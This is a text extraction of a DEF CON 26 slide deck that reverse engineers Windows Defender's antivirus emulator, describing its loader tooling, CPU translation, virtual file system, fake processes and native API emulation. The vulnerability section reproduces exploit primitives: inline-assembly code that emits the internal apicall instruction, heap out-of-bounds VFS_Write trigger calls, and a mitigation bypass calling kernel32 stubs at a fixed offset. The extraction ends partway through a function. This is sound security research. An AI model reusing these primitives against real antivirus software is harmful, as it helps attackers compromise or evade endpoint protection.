Windows Offender:
Reverse Engineering Windows Defender's Antivirus Emulator
Alexei Bulazel @0xAlexei
DEF CON 26

About Me
 Security researcher at ForAllSecure  Firmware RE & cyber policy at River Loop Security  RPI / RPISEC alumnus  First time speaking at DEF CON!
This is my personal research, any views and opinions expressed are my own, not those of any employer
@0xAlexei

This Presentation Is...
 A deeply technical look at Windows Defender Antivirus' binary emulator internals
 As far as I know, the first conference talk about reverse engineering any antivirus software's binary emulator

This Presentation Is...
 A deeply technical look at Windows Defender Antivirus' binary emulator internals

This Presentation Is Not...
 An evaluation of Windows Defender Antivirus' efficacy as an antivirus product

 As far as I know, the first conference talk about reverse engineering any antivirus software's binary emulator

 Related to Windows Defender ATP, or any technologies under the Windows Defender name

Outline
1. Introduction
a. Background b. Introduction to Emulation
2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research 5. Conclusion

Why Windows Defender Antivirus
Windows' built-in antivirus software:
 Now the "Defender" name covers multiple mitigations and security controls built into Windows
 This presentation is about Windows Defender Antivirus, not Windows Defender ATP, Application Guard, Exploit Guard, etc...

Why Windows Defender Antivirus
Windows' built-in antivirus software:
 Now the "Defender" name covers multiple mitigations and security controls built into Windows
 This presentation is about Windows Defender Antivirus, not Windows Defender ATP, Application Guard, Exploit Guard, etc...
 Huge AV market share - "8% of systems running Windows 7 and Windows 8 are running Windows Defender and more than 50% of Windows 10 devices"*
*windowsreport.com/windows-defender-enterprise-antivirus/

Why Windows Defender Antivirus
Windows' built-in antivirus software:
 Now the "Defender" name covers multiple mitigations and security controls built into Windows
 This presentation is about Windows Defender Antivirus, not Windows Defender ATP, Application Guard, Exploit Guard, etc...
 Huge AV market share - "8% of systems running Windows 7 and Windows 8 are running Windows Defender and more than 50% of Windows 10 devices"*
 Runs unsandboxed as NT AUTHORITY\SYSTEM  Exploit = initial RCE + privilege escalation + AV bypass
 Surprisingly easy for attackers to reach remotely
*windowsreport.com/windows-defender-enterprise-antivirus/

Motivation

 Tavis and co. at P0 dropped some awesome Defender bugs
 I had analyzed AVs before, but never Windows Defender
 I reversed Defender's JS engine for ~4 months, then got interested in the Windows emulator
 My personal research side project during winter 2017-2018: ~5 months of reversing, another month documenting

Target - mpengine.dll
mpam-fe.exe released monthly:
 mpengine.dll
"Microsoft Malware Protection Engine"
Also bundles 4 other binaries
 MPSigStub.exe
"Microsoft Malware Protection Signature Update Stub"

mpengine.dll provides malware scanning and detection capabilities other AV features and OS integration are handled in Defender's other components

 mpasbase.vdm  mpasdlta.vdm 

 mpavbase.vdm  mpavdlta.vdm

32 & 64-bit builds

My Prior Research:
Windows Defender's JavaScript Engine
bit.ly/ 2qio857
Presented at REcon Brussels (Belgium), February 2018

JS Engine bit.ly/2qio857
JS engine used for analysis of potentially malicious code reversed from binary

JS Engine bit.ly/2qio857
JS engine used for analysis of potentially malicious code reversed from binary
Custom loader / shell used for dynamic experimentation - thanks Rolf Rolles!

JS Engine bit.ly/2qio857

JS engine used for analysis of potentially malicious code reversed from binary

AV instrumentation callbacks

Custom loader / shell used for dynamic experimentation - thanks Rolf Rolles!

JS Engine bit.ly/2qio857

JS engine used for analysis of potentially malicious code reversed from binary

Security at the cost of performance
AV instrumentation callbacks

Custom loader / shell used for dynamic experimentation - thanks Rolf Rolles!

Related Work
 Only a handful of prior publications on binary reversing of antivirus software
 Lots of conference talks, whitepapers, and blogs on antivirus evasion, including against emulators
 AVLeak with fellow RPI researchers Jeremy Blackthorne, Andrew Fasano, Patrick Biernat, and Dr. Bülent Yener - side channel-based black box emulator fingerprinting
 Tavis Ormandy's Defender bugs from 2017
 As far as I know, there's never been a publication about reverse engineering the internals of an AV emulator*
*AV industry companies have occasionally presented on the design of their emulators at conferences. Industry patents also often have interesting information about AV internals.

Outline
1. Introduction
a. Background b. Introduction to Emulation
2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research 5. Conclusion

Why Emulate?
Traditional AV model: scan files and look for known malware signatures (file hashes, sequences of bytes, file traits, etc...)

Why Emulate?
Traditional AV model: scan files and look for known malware signatures (file hashes, sequences of bytes, file traits, etc...)
Problem: signatures are easily evaded with packed code, novel binaries, etc

Why Emulate?
Traditional AV model: scan files and look for known malware signatures (file hashes, sequences of bytes, file traits, etc...)

Problem: signatures are easily evaded with packed code, novel binaries, etc

Solution: run unknown binaries in a virtual emulated environment - look for runtime malicious behavior or known signatures
 Not a new idea, in use for at least 15 years

a.k.a:  sandboxing  heuristic analysis  dynamic analysis  detonation  virtualization

Emulation Overview

nt!PEB
Settings
In-Emulator OS Facilities

Malware Binary AV Instrumentation

Other Scanning Engines

CPU Emulation

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Emulation Overview
 Load unknown potentially malicious binary

nt!PEB
Settings
In-Emulator OS Facilities

Malware Binary AV Instrumentation

Other Scanning Engines

CPU Emulation

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Emulation Overview

 Load unknown potentially malicious binary
 Begin running from entrypoint, and run until termination condition

nt!PEB
Settings
In-Emulator OS Facilities

Malware Binary AV Instrumentation

Other Scanning Engines

CPU Emulation

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Emulation Overview

 Load unknown potentially malicious binary
 Begin running from entrypoint, and run until termination condition
 Time

nt!PEB
Settings
In-Emulator OS Facilities

Malware Binary AV Instrumentation

Other Scanning Engines

CPU Emulation

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Emulation Overview

 Load unknown potentially malicious binary
 Begin running from entrypoint, and run until termination condition
 Time  Number of instructions

nt!PEB
Settings
In-Emulator OS Facilities

Malware Binary AV Instrumentation

Other Scanning Engines

CPU Emulation

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Emulation Overview

 Load unknown potentially malicious binary
 Begin running from entrypoint, and run until termination condition
 Time  Number of instructions  Number of API calls

nt!PEB
Settings
In-Emulator OS Facilities

Malware Binary AV Instrumentation

Other Scanning Engines

CPU Emulation

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Emulation Overview

 Load unknown potentially malicious binary
 Begin running from entrypoint, and run until termination condition
 Time  Number of instructions  Number of API calls  Amount of memory used

nt!PEB
Settings
In-Emulator OS Facilities

Malware Binary AV Instrumentation

Other Scanning Engines

CPU Emulation

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Emulation Overview

 Load unknown potentially malicious binary
 Begin running from entrypoint, and run until termination condition
 Time  Number of instructions  Number of API calls  Amount of memory used  etc... 

nt!PEB
Settings
In-Emulator OS Facilities

Malware Binary AV Instrumentation

Other Scanning Engines

CPU Emulation

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Emulation Overview

 Load unknown potentially malicious binary
 Begin running from entrypoint, and run until termination condition
 Time  Number of instructions  Number of API calls  Amount of memory used  etc... 

nt!PEB
Settings
In-Emulator OS Facilities

 Collect heuristic observations about runtime behavior, look for signatures in memory or dropped to disk, etc...

CPU Emulation

Malware Binary AV Instrumentation

Other Scanning Engines

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Outline
1. Introduction 2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research 5. Conclusion

Static Analysis
 ~12 MB DLL  ~30,000 functions  IDA Pro
 Patch analysis with BinDiff
 Microsoft publishes PDBs

Dynamic Analysis & Loader
AV-Specific Challenges:
 Protected Process
 Cannot debug, even as local admin
 Introspection  Scanning on demand  Code reachability may be configuration /
heuristics dependent
"Repeated vs. single-round games in security" Halvar Flake, BSides Zurich Keynote

Dynamic Analysis & Loader
AV-Specific Challenges:
 Protected Process
 Cannot debug, even as local admin
 Introspection  Scanning on demand  Code reachability may be configuration /
heuristics dependent
Solution: Custom loaders for AV binaries
"Repeated vs. single-round games in security" Halvar Flake, BSides Zurich Keynote

Tavis Ormandy's loadlibrary git.io/fbp0X
 PE loader for Linux
 Shim out implementations for Windows API imports  Only implements the bare minimum to get mpengine.dll running, not
a general purpose Windows emulator or Wine replacement
 mpclient tool exposes the main scanning interface
 I built ~3k LoC of additional tooling on top of mpclient

mpclient git.io/fbp0X
Linux mpclient Binary

mpclient git.io/fbp0X

Linux mpclient Binary

MpEngine.dll

mpclient git.io/fbp0X

Linux mpclient Binary

 WinAPI Emulation

MpEngine.dll IAT

mpclient git.io/fbp0X

Linux mpclient Binary

 WinAPI Emulation

MpEngine.dll IAT

Emulator
g_syscalls
OutputDebugStringA WinExec ...

mpclient git.io/fbp0X

Linux mpclient Binary

 WinAPI Emulation

MpEngine.dll IAT

MZ...

Emulator
g_syscalls
OutputDebugStringA WinExec ...

Malware Binary

mpclient git.io/fbp0X

Linux mpclient Binary

 WinAPI Emulation

MpEngine.dll IAT

MZ...

Emulator
g_syscalls
OutputDebugStringA WinExec ...

Malware Binary

__rsignal

mpclient git.io/fbp0X

Linux mpclient Binary

 WinAPI Emulation

MpEngine.dll IAT

MZ...

Emulator
g_syscalls
OutputDebugStringA WinExec ...

Malware Binary

__rsignal

Scanning Engine Selection

mpclient git.io/fbp0X

Linux mpclient Binary

 WinAPI Emulation

MpEngine.dll IAT

MZ...

Emulator
g_syscalls
OutputDebugStringA WinExec ...

Malware Binary

__rsignal

Scanning Engine Selection

mpclient git.io/fbp0X

Linux mpclient Binary

 WinAPI Emulation

MpEngine.dll IAT

Threat Virus: Win32/Virut.BN!dam identified.
MZ...

Emulator
g_syscalls
OutputDebugStringA WinExec ...

Malware Binary

__rsignal

Scanning Engine Selection

Demo
Scanning with mpclient

Dynamic Analysis - Code Coverage
 Getting an overview of what subsystems are being hit is helpful in characterizing a scan or emulation session  Breakpoints are too granular
 Emulator has no output other than malware identification  Lighthouse code coverage plugin for IDA Pro from Markus
Gaasedelen of Ret2 Systems / RPISEC
Halvar Flake's SSTIC 2018 keynote

Outline
1. Introduction 2. Tooling & Process
3. Reverse Engineering
a. Startup b. CPU Emulation c. Instrumentation d. Windows Emulation &
Environment
4. Vulnerability Research 5. Conclusion

Getting Emulated
 __rsignal function provides an entry point into Defender's scanning - give it a buffer of data and it returns a malware classification
 Defender uses emulation to analyze executables it does not recognize with other less expensive analyses
 Emulation results are cached - a given binary will only be emulated once, even if scanned multiple times

Emulator Initialization
 Allocate memory  Initialize various objects and subsystems used
during emulation  Load the binary to be analyzed - relocate,
resolve imports, etc  Initialize virtual DLLs in the process memory
space
 Heuristic observations about the binary are recorded - section alignment, number of imports, etc

Outline
1. Introduction 2. Tooling & Process
3. Reverse Engineering
a. Startup b. CPU Emulation c. Instrumentation d. Windows Emulation &
Environment
4. Vulnerability Research 5. Conclusion

CPU Emulation
 Support for many architectures
 This presentation looks at x86 32-bit
 Technically dynamic translation, not "emulation"
 Lift to IL, JIT compile to sanitized x86
 Architecture-specific software emulation functions handle unique or difficult to lift instructions
 The subsystem is incredibly complicated, and could be a full talk in its own right
 Not a primary focus of this research and the subsystem I understand the least about

DT_platform_x86_16 = 0n0 DT_platform_x86_32 = 0n1 DT_platform_x86_64 = 0n2 DT_platform_emu_IL = 0n3 DT_platform_NETRPF = 0n4 DT_platform_NETEmu = 0n5 DT_platform_DTlib32 = 0n6 DT_platform_DTlib64 = 0n7 DT_platform_VMProtect = 0n8 DT_platform_ARM = 0n9 DT_platform_count = 0n10

*_2_IL Lifting

Individual architecture to IL lifting
Grab the bytes of opcode, determine type, then emit IL accordingly

x86_IL_translator::translate

Example: Single-byte x86 push register opcodes all map to type 0x13

IL Emulation in Software Emulator can run IL bytecode in software

run_IL_emulator

I did not observe this software IL emulator being invoked during my research
 Hypothesis: used for non-x86 host systems, e.g., Windows on ARM?
eIL_ID_xor8 = 0n107 eIL_ID_xor16 = 0n108 eIL_ID_xor32 = 0n109

IL-to-x86 JIT Translation

IL code can be translated to x86 and

executed, a basic block at a time

Check out

I observed this IL-to-x86 JIT being exercised during research

MSFT's VB2005 paper

lea opcode = 0x8d

Calls to esc[ape] functions are JITted for special handling of unique instructions

Architecture-Specific esc Handlers
Architecture-specific functions provide handling for unique architectural events and emulation of unique instructions

x86_common_context::emulate_CPUID
Architecture-specific software emulation for x86 CPUID instruction Code coverage provided by Lighthouse

Outline
1. Introduction 2. Tooling & Process
3. Reverse Engineering
a. Startup b. CPU Emulation c. Instrumentation d. Windows Emulation &
Environment
4. Vulnerability Research 5. Conclusion

Instrumenting mpengine
Problem: little visibility into engine
 Coverage for the big picture, breakpoints for detailed observation
Only output is malware detection
Threat Virus: Win32/Virut.BN!dam identified.

Instrumenting mpengine

Problem: little visibility into engine
 Coverage for the big picture, breakpoints for detailed observation

Only output is malware detection

Solution: a malware's eye view
 mpengine.dll has functions that are invoked when our malware calls certain Windows APIs
 Create a binary to explore the AV from inside - hook and reuse existing functions to share that view with us on the outside

Threat Virus: Win32/Virut.BN!dam identified.

mpclient git.io/fbp0X

Linux mpclient Binary

 WinAPI Emulation

MpEngine.dll IAT

Threat Virus: Win32/Virut.BN!dam identified.
MZ...

Emulator
g_syscalls
OutputDebugStringA WinExec ...

Malware Binary

__rsignal

Scanning Engine Selection

Modified mpclient - ~3k LoC added github.com/0xAlexei

Linux mpclient WinAPI

Binary

Emulation

MpEngine.dll IAT

Emulator

OutputDebugSt ringA hook
Print to stdout
WinExec hook
Other actions...

MZ...

Malware Binary

g_syscalls
OutputDebugStringA WinExec ...

__rsignal

Scanning Engine Selection

OutputDebugStringA Hook
Hook the native function pointer that gets called when OutputDebugStringA is called in-emulator
Use existing functions in Defender to interact with function parameters and virtual memory
Mark - Thanks for the idea!

OutputDebugStringA Hook

OutputDebugStringA Hook
Declaration - void * for pe_vars_t *

OutputDebugStringA Hook

Local variable to hold parameters same as Parameters<1>

Declaration - void * for pe_vars_t *

OutputDebugStringA Hook

Local variable to hold parameters same as Parameters<1>
Pull parameters off of the virtual stack by calling Parameters<1> function inside mpengine.dll

Declaration - void * for pe_vars_t *

Parameters are just addresses within the emulator's virtual memory

OutputDebugStringA Hook

Local variable to hold parameters same as Parameters<1>
Pull parameters off of the virtual stack by calling Parameters<1> function inside mpengine.dll

Declaration - void * for pe_vars_t *

Parameters are just addresses within the emulator's virtual memory

GetString calls into
mpengine.dll functions which translate an emulator virtual memory address (the parameter) into a real pointer

OutputDebugStringA Hook

Local variable to hold parameters same as Parameters<1>
Pull parameters off of the virtual stack by calling Parameters<1> function inside mpengine.dll

Declaration - void * for pe_vars_t *

GetString calls into
mpengine.dll functions which translate an emulator virtual memory address (the parameter) into a real pointer

Parameters are just addresses within the emulator's virtual memory

Now we can just print the string to stdout

Demo
Hooking OutputDebugStringA

myapp.exe
I/O communication with outside the emulator by calling OutputDebugStringA and other hooked functions

Factors That Can Prevent Emulation:*
 Simplicity / lack of code entropy  Linking against unsupported DLLs  Calling unsupported functions  Optimizations using complex instructions  Targeting overly modern Windows builds
Solutions:
 Add in junk code  Strip down linkage to bare minimums  Disable all optimizations  Define your own entry point  Target old Windows versions

Malware Binary

*These are problems for AV emulators in general in my experience. Defender seems more flexible than others, but I did still have to massage compiler settings to get a consistently emulated binary

Outline
1. Introduction 2. Tooling & Process
3. Reverse Engineering
a. Startup b. CPU Emulation c. Instrumentation d. Windows Emulation &
Environment
4. Vulnerability Research 5. Conclusion

Windows Emulation & Environment
1. Usermode Environment 2. Usermode Code 3. User-Kernel Interaction 4. Kernel Internals 5. AV Instrumentation

Virtual File System Contents
Dump file system contents with a similar trick to the OutputDebugStringA hook - just pass void pointers to arbitrary data
 1455 files on the 2/28/18 build
 Whole FS can be dumped in a second or two
 Mostly fake executables  A handful of fake config files  Various text "goat" files  Lots of empty files

Demo
Dumping The File System

C:\\aaa_TouchMeNot_.txt

Fake Config Files

C:\\Mirc\mirc.ini
[chanfolder] n0=#Blabla n1=#End
C:\\Mirc\script.ini
[script] ; blabla

C:\\Windows\msdfmap.ini
[connect default] Access=NoAccess [sql default] Sql=" " [connect CustomerDatabase] Access=ReadWrite Connect="DSN=AdvWorks" [sql CustomerById] Sql="SELECT * FROM Customers WHERE CustomerID = ?" [connect AuthorDatabase] Access=ReadOnly Connect="DSN=MyLibraryInfo;UID=MyUserID;PWD=MyPassword" [userlist AuthorDatabase] Administrator=ReadWrite [sql AuthorById] Sql="SELECT * FROM Authors WHERE au_id = ?"

Virtual Registry

Huge virtual registry with thousands of entries

Processes
Various processes are shown as running on the system
These are not real running processes, just names returned in order to present a realistic execution environment to malware
"myapp.exe" is the name of the process under emulation - PID varies in different mpengine builds

0 - [System Process] 4 - System 356 - smss.exe 608 - csrss.exe 624 - winlogon.exe 676 - services.exe 680 - lsass.exe 700 - kav.exe 704 - avpcc.exe 708 - _avpm.exe 712 - avp32.exe 716 - avp.exe 720 - antivirus.exe 724 - fsav.exe 728 - norton.exe 732 - msmpeng.exe 736 - msmpsvc.exe 740 - mrt.exe 744 - outpost.exe 856 - svchost.exe

1084 - svchost.exe 1268 - spoolsv.exe 1768 - explorer.exe 1796 - iexplore.exe 1800 - outlook.exe 1804 - msimn.exe 1808 - firefox.exe 1812 - icq.exe 1816 - yahoomessenger.exe 1820 - msnmsgr.exe 1824 - far.exe 1828 - trillian.exe 1832 - skype.exe 1836 - googletalk.exe 1840 - notepad.exe 1844 - wmplayer.exe 1848 - net.exe 1852 - spawned.exe 3904 - myapp.exe

Demo
Dumping The Process Listing

Windows Emulation & Environment
1. Usermode Environment 2. Usermode Code 3. User-Kernel Interaction 4. Kernel Internals 5. AV Instrumentation

Windows API Emulation
Two types of Windows API functions:
 Stay in usermode  stay in the emulator  Resolve to syscall  trap to native emulation
Implemented just like the real Windows API - DLLs
 Symbols indicate they are called "vdlls"  Present on disk and in memory in the emulator - like real
Windows  VDLLs are not present in mpengine.dll, must be
dynamically loaded from VDMs

Reversing VDLLs

In-Emulator VDLL Emulations
 In-emulator emulations stay within the emulator  Code is run within the dynamic translation system  Some emulations stub out to hardcoded returns
Computer name is "HAL9TH"
Username is "JohnDoe"

Stubbed Out Functions

Complex functions are stubbed out to return hardcoded values or halt emulation

mspaint.exe

RPCRT4.DLL

NTOSKRNL.EXE

ws2_32.dll Winsock library is uniquely full of fingerprints - strings with "Mp" and German websites

Windows Emulation & Environment
1. Usermode Environment 2. Usermode Code 3. User-Kernel Interaction 4. Kernel Internals 5. AV Instrumentation

Native Emulation
 Complex functions that cannot be handled in-emulator must be emulated in native code  Akin to usermode  kernel, or VM guest  host transitions  Emulator to native transition implemented with a custom hypercall instruction - apicall
0x0F 0xFF 0xF0 [4 byte immediate]
 Stubs that apicall to various functions are included in VDLLs

apicall disassembly provided by an IDA Processor Extension Module
Emulated VDLL: kernel32! CopyFileWWorker

apicall
Native code: mpengine!KERNEL32_DLL_CopyFileWWorker

g_syscalls
apicall instruction use triggers dispatch to function pointer in g_syscalls table
This is the table we modify when hooking OutputDebug StringA

dt mpengine!esyscall_t +0x0 proc : Ptr32 void +0x4 encrc : Uint4B

kernel32!OutputDebugStringA
In-emulator VDLL code

kernel32!OutputDebugStringA
In-emulator VDLL code

kernel32!OutputDebugStringA
Native emulation function

In-emulator VDLL code

apicall

Emulated VDLL Functions

ADVAPI32
RegCreateKeyExW RegDeleteKeyW RegDeleteValueW RegEnumKeyExW RegEnumValueW RegOpenKeyExW RegQueryInfoKeyW RegQueryValueExW RegSetValueExW
USER32
MessageBoxA
KERNEL32
CloseHandle CopyFileWWorker CreateDirectoryW CreateFileMappingA

CreateProcessA CreateToolhelp32Snapshot ExitProcess ExitThread FlushFileBuffers GetCommandLineA GetCurrentProcess GetCurrentProcessId GetCurrentThread GetCurrentThreadId GetModuleFileNameA GetModuleHandleA GetProcAddress GetThreadContext GetTickCount LoadLibraryW MoveFileWWorker MpAddToScanQueue MpCreateMemoryAliasing MpReportEvent

MpReportEventEx MpReportEventW MpSetSelectorBase OpenProcess OutputDebugStringA ReadProcessMemory RemoveDirectoryW SetFileAttributesA SetFileTime Sleep TerminateProcess UnimplementedAPIStub VirtualAlloc VirtualFree VirtualProtectEx VirtualQuery WinExec WriteProcessMemory

Emulated ntdll.dll Functions

VFS_DeleteFileByHandle VFS_FileExists

MpGetSelectorBase MpUfsMetadataOp NtCloseWorker NtContinue NtControlChannel NtCreateEventWorker NtCreateFileWorker NtCreateMutantWorker NtCreateSemaphoreWorker NtCreateThreadWorker

NtReadFileWorker NtReleaseMutantWorker NtReleaseSemaphoreWorker NtResetEventWorker NtResumeThreadWorker NtSetContextThread NtSetEventWorker NtSetInformationFileWorker NtSetLdtEntries NtSuspendThreadWorker

VFS_FindClose VFS_FindFirstFile VFS_FindNextFile VFS_FlushViewOfFile VFS_GetAttrib VFS_GetHandle VFS_GetLength VFS_MapViewOfFile VFS_MoveFile VFS_Open

NtDeleteFileWorker

NtTerminateThreadWorker

NtDuplicateObjectWorker

NtWaitForMultipleObjectsWorker_PostBlock

NtGetContextThread

NtWaitForMultipleObjectsWorker_PreBlock

NtOpenEventWorker

NtWriteFileWorker

NtOpenMutantWorker NtOpenSemaphoreWorker NtOpenThreadWorker NtPulseEventWorker NtQueryInformationFileWorker NtQueryInformationThreadWorker

ObjMgr_ValidateVFSHandle ThrdMgr_GetCurrentThreadHandle ThrdMgr_SaveTEB ThrdMgr_SwitchThreads VFS_CopyFile VFS_DeleteFile

VFS_Read VFS_SetAttrib VFS_SetCurrentDir VFS_SetLength VFS_UnmapViewOfFile VFS_Write

Native Emulation Functions
Native emulation functions all take parameter pe_vars_t *, ~½mb large struct containing entire emulation session context

Native Emulation Functions
Native emulation functions all take parameter pe_vars_t *, ~½mb large struct containing entire emulation session context
Templated Parameters functions retrieve parameters to the function from the emulated stack

Native Emulation Functions
Native emulation functions all take parameter pe_vars_t *, ~½mb large struct containing entire emulation session context
Templated Parameters functions retrieve parameters to the function from the emulated stack
Return values, register state, CPU tick count, etc, are managed through various functions that manipulate pe_vars_t

Interacting With Virtual Memory
mmap functions allow access to the emulated memory space Interface similar to Unicorn Engine and other similar tools

Interacting With Virtual Memory
mmap functions allow access to the emulated memory space Interface similar to Unicorn Engine and other similar tools
Wrapper functions around these functions make common operations easier

Windows Emulation & Environment
1. Usermode Environment 2. Usermode Code 3. User-Kernel Interaction 4. Kernel Internals 5. AV Instrumentation

Windows Kernel Emulation
Windows kernel facilities are emulated with native code
 Object Manager  Process management  File system  Registry  Synchronization primitives

Object Manager
 The Object Manager is an essential part of the Windows Executive - provides kernel mode resource management - processes, files, registry keys, mutexes, etc
 Defender supports 5 types of objects: File, Thread, Event, Mutant (Mutex), Semaphore
 Manages system state during emulation that is persistent between native emulation API calls

Object Manager Types
5 types of object: 1. File

dt mpengine!ObjectManager::Object

+0x0 __VFN_table

: Ptr32

+0x4 m_openCount

: Uint4B

+0x8 m_isPersistent : Bool

+0x9 m_canDelete

: Bool

+0xa m_signal

: Bool

Stored in memory as C++ objects

2. Thread 3. Event 4. Mutant (Mutex) 5. Semaphore
Objects are stored in a map, tracked by pid and handle

dt mpengine!

ObjectManager::FileObject

+0x0 __VFN_table

: Ptr32

+0x4 m_openCount

: Uint4B

+0x8 m_isPersistent : Bool

+0x9 m_canDelete

: Bool

+0xa m_signal

: Bool

+0xc m_fileHandle : Uint4B

+0x10 m_accessMode : Uint4B

+0x14 m_shareAccess: Uint4B

+0x18 m_cursor

: Uint4B

dt mpengine!ObjectManager::MutantObject

+0x0 __VFN_table

: Ptr32

+0x4 m_openCount

: Uint4B

+0x8 m_isPersistent : Bool

+0x9 m_canDelete

: Bool

+0xa m_signal

: Bool

+0xc m_ownerThrdId : Uint4B

+0x10 m_isAbandoned: Uint4B

+0x14 m_waitCount : Uint4B

Objects identify themselves by C++ virtual method call, RTTI is used to cast from ObjectManager::Object to specific subclasses

Object Manager Integration
The Object Manager manages persistent system state during an emulation session
NTDLL_DLL_NtOpenMutantWorker
NTDLL_DLL_NtSetInformationFileWorker

Object Manager Integration
The Object Manager manages persistent system state during an emulation session

Current process handle is emulated as 0x1234

NTDLL_DLL_NtOpenMutantWorker

NTDLL_DLL_NtSetInformationFileWorker

VFS - Virtual File System
 Native emulation functions are filed under NTDLL (but accessible from multiple VDLLs via apicall stubs)
 NTDLL_DLL_VFS_* functions do administrative work before calling into internal VFS_* functions that actually engage with the virtual file system, calling its methods to manipulate contents
 NTDLL Nt* emulation functions that interact with the file system call down into VFS_* functions after checking / normalizing / sanitizing inputs

VFS-Specific Native Emulations

ObjMgr_ValidateVFSHandle

VFS_Open

VFS_CopyFile

VFS_Read

VFS_DeleteFile

VFS_SetAttrib

VFS_DeleteFileByHandle

VFS_SetCurrentDir

VFS_FileExists

VFS_SetLength

VFS_FindClose

VFS_UnmapViewOfFile

VFS_FindFirstFile

VFS_Write

VFS_FindNextFile VFS_FlushViewOfFile VFS_GetAttrib VFS_GetHandle

dt mpengine!pe_vars_t ... +0x241e0 vfs +0x241e4 vfsState

: Ptr32 VirtualFS : Ptr32 VfsRunState

VFS_GetLength VFS_MapViewOfFile VFS_MoveFile VFS_Open

+0x241e8 vfsNumVFOs +0x241ec vfsVFOSizeLimit +0x241f0 vfsRecurseLimit +0x241f4 vfsFlags ...

: Uint4B : Uint4B : Uint4B : Uint4B

Windows Emulation & Environment
1. Usermode Environment 2. Usermode Code 3. User-Kernel Interaction 4. Kernel Internals 5. AV Instrumentation

Defender Internal Functions
Internal administration and configuration functions accessible via apicall
MpAddToScanQueue
Queue up a file (e.g., a dropped binary) for scanning
MpCreateMemoryAliasing
Alias memory in emulator
MpReportEvent, MpReportEvent{Ex,W}
Report malware behavior to inform heuristic detections
Mp{Get,Set}SelectorBase
Get/set segment registers (CS, DS, ES, etc)
MpUfsMetadataOp
Get/set metadata about the file being scanned
NtControlChannel
IOCTL-like administration for the AV engine

MpReportEvent

Used to communicate information about malware binary actions with Defender's heuristic detection engine

MpReportEvent

MpReportEvent - AV Processes

Processes types are grouped Emulated process

by PID - processes for antivirus information is stored

software has 700 PIDs

in a data structure in

700 - kav.exe 704 - avpcc.exe 708 - _avpm.exe

the kernel32.dll VDLL and presented when enumerated

712 - avp32.exe

716 - avp.exe

720 - antivirus.exe

724 - fsav.exe

728 - norton.exe

732 - msmpeng.exe

736 - msmpsvc.exe 740 - mrt.exe

Calling TerminateProcess on an AV product

744 - outpost.exe

triggers an MpReportEvent call

NtControlChannel Options

1 set attribute set_static_unpacking

14

2 delete attribute store pea_disable_static_unpacking

15

3 get mpengine.dll version number

16

4 set attribute set_pea_enable_vmm_grow

17

5 set attribute set_pea_deep_analysis

18

6 set attribute set_pea_hstr_exhaustive

19

7 set attribute set_pea_aggressiveimport

20

8 set attribute set_pea_skip_unimplemented_opc

21

9 set attribute pea_skip_unimplemented_opc

22

10 set attribute set_pea_disable_apicall_limit

23+24

11 get arbitrary attribute

25

12 check if malware is packed with a given packer

26-31

13 set attribute pea_disable_seh_limit

32

get arbitrary attribute substring set pe_vars_t->max_respawns value modify register state (?) set arbitrary attribute load microcode set breakpoint retrieve get_icnt_inside_loop value some sort of domain name signature check set pe_vars_t->internalapis switch_to_net32_proc (.NET) get arbitrary pe attribute by number unimplemented scan_msil_by_base

Outline
1. Introduction 2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research
a. Understanding P0's Vulnerabilities b. Bypassing Mitigations With apicall Abuse c. Fuzzing
5. Conclusion

Tavis' apicall Trick
 Build binary with a rwx .text section, generate apicall instruction on the fly as needed
 apicall instruction triggers native emulation functions from malware .text section with attacker controlled

DWORD MpApiCall(PCHAR Module, PCHAR ProcName, ...) {
DWORD Result; DWORD ApiCrc;

ApiCrc = crcstr(Module) ^ crcstr(ProcName);

_asm { mov mov mov lea _emit _emit _emit
apicode: _emit _emit _emit _emit mov mov
}

eax, dword ptr ApiCrc

[apicode], eax

ebx, esp

esp, ProcName

0x0f

; apicall opcode

0xff

; apicall opcode

0xf0

; apicall opcode

0x00 0x00 0x00 0x00 esp, ebx Result, eax

; apicall immediate ; apicall immediate ; apicall immediate ; apicall immediate

return Result; }

Tavis' NtControlChannel Bug NtControlChannel(0x12,...)

Tavis' NtControlChannel Bug NtControlChannel(0x12,...)

Tavis' NtControlChannel Bug NtControlChannel(0x12,...)
count is user controlled

Tavis' NtControlChannel Bug NtControlChannel(0x12,...)

count is user controlled

Patched with max 0x1000 count check

Tavis' VFS_Write Bug
Heap OOB r/w: buffer gets extended to offset, but no space is allocated for it. r/w at arbitrary offsets then possible

VFS_Write( unsigned int hFile, char * pBuffer, unsigned int nBytesToWrite, unsigned int nOffset, unsigned int * pBytesWritten
);

VFS_Write(Handle, Buf, 0, 0xffffffff, 0); VFS_Write(Handle, Buf, 0x7ff, 0x41414141, 0);

Outline
1. Introduction 2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research
a. Understanding P0's Vulnerabilities b. Bypassing Mitigations With apicall Abuse c. Fuzzing
5. Conclusion

Locking Down apicall

is_vdll_page call added to __call_api_by_crc in 6/20/2017 mpengine.dll build - is the apicall instruction coming from a VDLL?

New AV heuristic trait added

Can't just trigger apicall from malware .text section or otherwise malware-created memory (eg: rwx allocation) anymore

If apicall did not come from a VDLL, set a heuristic and deny it

Proceed with processing if apicall is ok

Bypass
 apicall stubs are located throughout VDLLs
 They can be located in memory and called directly by malware, with attacker controlled arguments
 Passes is_vdll_page checks
 Response from Microsoft: "We did indeed make some changes to make this interface harder to reach from the code we're emulating -however, that was never intended to be a trust boundary.
Accessing the internal APIs exposed to the emulation code is not a security vulnerability..."

Bypass Example 1

OutputDebugStringA can be normally hit from kernel32, so

VOID OutputDebugStringA_APICALL(PCHAR msg) this is ultimately just a unique way

{

of doing that

typedef VOID(*PODS)(PCHAR);

HMODULE k32base = LoadLibraryA("kernel32.dll");

PODS apicallODS = (PODS)((PBYTE)k32base + 0x16d4e);

apicallODS(msg);

} Kernel32 base offset:

0x16d4e

Comes from kernel32 VDLL, so passes is_vdll_page checks

Bypass Example 2

NtControlChannel should not be exposed to malware

VOID NtControlChannel_APICALL()

running inside the emulator

{

